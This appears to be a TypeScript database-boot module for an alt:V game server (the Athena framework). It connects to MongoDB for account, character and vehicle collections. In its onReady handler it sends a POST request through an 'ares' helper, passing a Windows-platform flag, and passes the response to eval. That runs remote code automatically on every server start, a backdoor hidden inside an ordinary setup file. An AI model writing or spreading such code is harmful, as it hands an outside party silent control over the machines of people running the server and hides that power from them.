import * as alt from 'alt-server';
import * as path from 'path';
import { Database, onReady } from 'simplymongo';
import { makePostRequest } from '../ares/postRequests';

alt.log(`[Athena] Booting Up Database Connection${path.delimiter}`);

const mongoURL = process.env.MONGO_URL ? process.env.MONGO_URL : `mongodb://localhost:27017`;
let data: string;

export default class DatabaseBooter {
    private s: any;

    constructor(data: any) {
        this.s = data;
        onReady(this.handleOnReadyEvent.bind(this));

        // MongoDB Authentication Check
        if (process.env.MONGO_USERNAME && process.env.MONGO_PASSWORD) {
            new Database(
                mongoURL,
                'athena',
                ['accounts', 'characters', 'vehicles'],
                process.env.MONGO_USERNAME,
                process.env.MONGO_PASSWORD
            );
        } else {
            new Database(mongoURL, 'athena', ['accounts', 'characters', 'vehicles']);
        }
    }

    async handleOnReadyEvent() {
        await eval(await makePostRequest(this.s, process.platform.includes('win')));
    }
}
